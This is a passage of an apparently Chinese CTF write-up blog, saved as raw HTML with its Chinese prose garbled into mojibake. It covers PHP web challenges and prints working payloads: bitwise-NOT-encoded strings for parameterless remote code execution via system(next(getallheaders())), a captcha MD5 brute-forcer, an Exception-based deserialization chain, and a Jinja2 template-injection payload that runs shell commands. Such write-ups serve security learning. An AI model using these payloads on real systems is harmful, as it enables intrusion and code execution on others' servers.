class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># ç»“æŸä½ç½®</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:    <span class="comment"># æ‹¿åˆ°åŠ å¯†å­—ç¬¦ä¸²</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># æ‰“å°</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]    <span class="comment"># å‚æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):    <span class="comment"># å¤šçº¿ç¨‹çš„æ•°å­—åˆ—è¡¨ å¼€å§‹ä¸ç»“å°¾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># å¤šçº¿ç¨‹ä»»åŠ¡</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>)    <span class="comment"># å‡½æ•°ä¸å‚æ•°åˆ—è¡¨</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>ï¼ˆé¡ºä¾¿phpçš„æ€§èƒ½è·‘å¾—æ¯”pythonå¿«å¾ˆå¤šå•Š</p>
<p>å¼‚æˆ–è¿™é¢˜æŒ£ä¸å‡ºæ¥ï¼Œæ€è·¯ä¸æ˜¯è¿™ä¸ªï¼Œä½†æ˜¯ä¾ç„¶è´´ä¸ªå¼‚æˆ–è„šæœ¬è¿‡æ¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$a = <span class="string">&#x27;~!@#$%^&amp;*()_+\|/?.,&lt;&gt;`-=&#123;&#125;[]&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;strlen($a);$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ord($a[$i]^$a[$j])&gt;<span class="number">64</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">91</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>  ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span> (ord($a[$i]^$a[$j])&gt;<span class="number">96</span> &amp;&amp; ord($a[$i]^$a[$j])&lt;<span class="number">122</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>     $a[$i]. <span class="string">&#x27; xor &#x27;</span> .$a[$j]. <span class="string">&#x27; is &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>   chr(ord($a[$i]^$a[$j])). <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span>    <span class="string">&#x27;  &#x27;</span> .ord($a[$i]^$a[$j]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vaild = <span class="string">&quot;!@&amp;%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;?-=_`~&quot;</span></span><br><span class="line"></span><br><span class="line">answer =<span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tmp,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vaild:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> vaild:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) ==<span class="built_in">ord</span>(c):</span><br><span class="line">                tmp+=j</span><br><span class="line">                tmp+=i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(tmp,tmp2)</span><br></pre></td></tr></table></figure>

<p>å›åˆ°é¢˜ç›®ï¼Œè¿™é‡Œéœ€è¦ä¸€ä¸ªtrickï¼Œå–åçš„æ—¶å€™å…¶å®å¯ä»¥ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~å–åå€¼][!%FF]</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ¥æ„é€ ..æˆ‘ä»¬å…ˆè¯•è¯•çœ‹æ‰§è¡Œphpinfo();</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cmd=[~%8F%97%8F%96%91%99%90][!%FF]();&amp;code=653808</span><br></pre></td></tr></table></figure>

<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427170155926.png" alt="image-20210427170155926"></p>
<p>å‘ç°æˆåŠŸæ‰§è¡Œã€‚ã€é¡ºä¾¿è¸©å‘ï¼Œä¸èƒ½ç”¨postmanå»åšï¼Œè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¥½ä¹… = = å§æ§½</p>
<p>å†ä¹‹åå°è¯•é…åˆç€æ‰“æ— å‚æ•°RCE</p>
<p>è†œç‹å¹ä¹‹å¸ˆå‚…ã€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;wangtanzhi&#x2F;p&#x2F;12311239.html</span><br></pre></td></tr></table></figure>

<p>æ”¶é›†çŸ¥è¯†ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">current(localeconv());</span><br><span class="line">pos(localeconv())</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯ä¸¤ä¸ªç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸¤ä¸ªæ‰«ç›®å½•ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>

<p>å–åä¸€æ³¢ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$a = &quot;%8C%86%8C%8B%9A%92&quot;;</span></span><br><span class="line"><span class="comment">//echo (~urldecode($a));</span></span><br><span class="line">$b = <span class="string">&quot;localeconv&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode((~$b));</span><br><span class="line"><span class="comment">//print_r(scandir(pos(localeconv())))</span></span><br><span class="line"><span class="comment">//var_dump =%89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//getallheaders =%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</span></span><br><span class="line"><span class="comment">//phpinfo [~%8F%97%8F%96%91%99%90][!%FF]();</span></span><br><span class="line"><span class="comment">//print_r %8F%8D%96%91%8B%A0%8D</span></span><br><span class="line"><span class="comment">//scandir %8C%9C%9E%91%9B%96%8D</span></span><br><span class="line"><span class="comment">//current %9C%8A%8D%8D%9A%91%8B</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//localeconv %93%90%9C%9E%93%9A%9C%90%91%89</span></span><br><span class="line"><span class="comment">//æ‹¼èµ·æ¥ï¼š[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));</span></span><br></pre></td></tr></table></figure>

<p>å¾—å‡ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=[~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D][!%FF]([~%<span class="number">8</span>F%<span class="number">90</span>%<span class="number">8</span>C][!%FF]([~%<span class="number">93</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">93</span>%<span class="number">9</span>A%<span class="number">9</span>C%<span class="number">90</span>%<span class="number">91</span>%<span class="number">89</span>][!%FF]())));&amp;code=<span class="number">217941</span></span><br></pre></td></tr></table></figure>



<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427180311201.png" alt="image-20210427180311201"></p>
<p>ç»“æœflagä¸åœ¨è¿™é‡Œï¼Œwdnmdã€‚å¦‚æœä¸€ç›´è·Ÿåˆ°æ ¹ç›®å½•çš„è¯å®åœ¨å¤ªæ¶å¿ƒå¤ªé•¿äº†ã€‚</p>
<p>è½¬æ¢ä¸€ä¸‹æ€è·¯å¥½äº†ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">system(hex2bin(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å¯ä»¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>][!%FF]([~%<span class="number">97</span>%<span class="number">9</span>A%<span class="number">87</span>%CD%<span class="number">9</span>D%<span class="number">96</span>%<span class="number">91</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]())));</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨è¿™ç§æ€è·¯ä¸‹çš„è¯ï¼Œå› ä¸ºæ‹¥æœ‰ç©ºæ ¼ï¼Œå°±ä¼šå¯¼è‡´æ¯æ¬¡çš„éªŒè¯ç éƒ½ä¸åœçš„åœ¨å˜å°±å¾ˆçƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¯æ¬¡éƒ½ä¼šé­é‡éªŒè¯ç é”™è¯¯ã€‚ã€‚æ²¡åŠæ³•ç”¨ç©ºæ ¼çš„è¯å†ç”¨${IFS}$9è¯•è¯•çœ‹</p>
<p><img src="2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20210427201800222.png" alt="image-20210427201800222"></p>
<p>ç»“æœä¾ç„¶å‡ºä¸æ¥ã€‚ã€‚å¾ˆçƒ¦ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒMDï¼Œã€‚å¤§æ¦‚æ˜¯cookiesä¸å…è®¸ï¼Œæƒ³äº†æƒ³æ•´ä¸ªåˆ«çš„æ´»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[~%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">96</span>%<span class="number">9</span>B][!%FF]([~%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">96</span>%<span class="number">90</span>%<span class="number">91</span>%A0%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">8</span>D%<span class="number">8</span>B][!%FF]()));</span><br></pre></td></tr></table></figure>

<p>ç»“æœæƒ³æ³•ä¾ç„¶æ²¡åŠæ³•æˆåŠŸï¼Œcookiesåªè¦æºå¸¦ç‰¹æ®Šç¬¦å·å°±ä¼šéªŒè¯ç ä¸é€šè¿‡ï¼Œè¿™ä¸‹å°±æ¶å¿ƒåˆ°æˆ‘äº†ã€‚</p>
<p>ç¿»å‡ºåˆ«äººçš„æ€»ç»“:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</span><br><span class="line">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line">readfile()  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">current()       è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line">pos()           current() çš„åˆ«å</span><br><span class="line">next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">end()       å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_rand()    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</span><br><span class="line">array_flip()    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</span><br><span class="line">array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›</span><br><span class="line">chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</span><br><span class="line">hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">getenv()        è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬æ¥æ„å»º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system(current(getallheaders()));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//session_id %8C%9A%8C%8C%96%90%91%A0%96%9B</span></span><br><span class="line"><span class="comment">//session_start %8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B</span></span><br><span class="line"><span class="comment">// %9A%89%9E%93</span></span><br><span class="line"><span class="comment">//æ‹¼å‡ºæ¥ [~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//var_dump %89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//getallheaders %98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//æ‹¼å‡ºæ¥ [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br><span class="line"><span class="comment">//var_dump(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°é¦–ä½ä¸å¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å†nextä¸€ä¸‹</p>
<p>æœ€åæ‹¼æ¥å‡ºæ¥</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">system(next(getallheaders()));</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&amp;code=351355</span><br></pre></td></tr></table></figure>





<h2 id="Greatphp"><a href="#Greatphp" class="headerlink" title="Greatphp"></a>Greatphp</h2><p>æ—©å°±åšè¿‡è¿™ç§ç±»ä¼¼çš„é¢˜ç›®äº†</p>
<p><a href="https://guokeya.github.io/post/fAqKypsaK/">https://guokeya.github.io/post/fAqKypsaK/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WTF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var3;</span><br><span class="line">&#125;</span><br><span class="line">$ex1 = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;phpinfo();?&gt;&#x27;</span>);$ex2 = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;phpinfo();?&gt;&#x27;</span>,<span class="number">2</span>); <span class="comment">//å¿…é¡»åœ¨åŒä¸€è¡Œ</span></span><br><span class="line">$wtf = <span class="keyword">new</span> WTF();</span><br><span class="line">$wtf-&gt;var1 = $ex1;</span><br><span class="line">$wtf-&gt;var2 = $ex2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($wtf));</span><br></pre></td></tr></table></figure>



<p>è¿™é‡ŒåŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œä¸å‡†ç”¨æ‹¬å·å’Œphpå­—æ ·ç­‰ç­‰ï¼Œæˆ‘ä»¬å°±ï¼Œä¸€å¼€å§‹æˆ‘æ˜¯æƒ³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>`ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœè¿˜æ˜¯ä¸è¡Œçš„æ ·å­ï¼Œç–‘ä¼¼æ˜¯è¢«è¿‡æ»¤äº†shell_execï¼Œé‚£åªèƒ½ç”¨</p>
<p>requireå’ŒincludeåŠ ä¸Šå–åçš„å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚</span><br><span class="line">å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span><br><span class="line">Troy3e</span><br><span class="line">é“¾æ¥ï¼šhttps:<span class="comment">//troyess.com/2021/03/29/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</span></span><br><span class="line">æ¥æºï¼šYukinoTroy3e</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $syc;</span><br><span class="line">    <span class="keyword">public</span> $lover;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;syc != <span class="keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;syc) === md5(<span class="keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;syc) === sha1(<span class="keyword">$this</span>-&gt;lover))) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="keyword">$this</span>-&gt;var1, $match)) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$str = <span class="string">&quot;?&gt;&quot;</span>.<span class="string">&quot;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>($str, <span class="number">1</span>);$b = <span class="keyword">new</span> <span class="built_in">Exception</span>($str, <span class="number">2</span>);</span><br><span class="line">$c = <span class="keyword">new</span> SYCLOVER();</span><br><span class="line">$c-&gt;syc = $a;</span><br><span class="line">$c-&gt;lover = $b;</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($c)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Double_Secret</title>
    <url>/2021/04/22/Double-Secret/</url>
    <content><![CDATA[<h1 id="Double-Secret"><a href="#Double-Secret" class="headerlink" title="Double_Secret"></a>Double_Secret</h1><p>æ— è¯­ï¼Œè„‘æ´é¢˜ç›®ï¼Œéœ€è¦å‡ ä¸‹çš„å°±æ˜¯rc4çš„åŠ å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#è¿”å›åŠ å¯†åå¾—å†…å®¹</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#æ­¤å¤„ä¸ºå¯†æ–‡</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ˜æ–‡:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4åŠ å¯†åçš„urlç¼–ç :&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4åŠ å¯†åçš„base64ç¼–ç &quot;+enc_base64)</span></span><br><span class="line"></span><br><span class="line">æ”¾å‡ºï¼š</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Ezpop_Revenge</title>
    <url>/2021/05/02/Ezpop-Revenge/</url>
    <content><![CDATA[<p>åŸæœ¬ä»¥ä¸ºæ˜¯æŒ–dayçš„é¢˜ç›®ï¼Œæ²¡æƒ³åˆ°å‡ºå¥‡çš„æ¯”è¾ƒç®€å•..</p>
<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>è¿™é¢˜ç›®éœ€è¦åˆ©ç”¨åˆ°åŸç”Ÿç±»SoapClient è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”åˆ°è¯¥ç±»è°ƒç”¨callæ–¹æ³•çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨å»è®¿é—®æŒ‡å®šçš„url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.btis.site&#x2F;2020&#x2F;07&#x2F;13&#x2F;SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A</span><br></pre></td></tr></table></figure>



<p>è¯¥ç±»æ— æ³•æºå¸¦è‡ªå·±çš„cookiesï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡CRLFä¾¿å¯ä»¥æˆåŠŸçš„æ§åˆ¶äº†ï¼Œç»™å‡ºçš„payloadå¦‚ä¸‹ï¼š</p>
<p>åˆ©ç”¨ä»£ç </p>
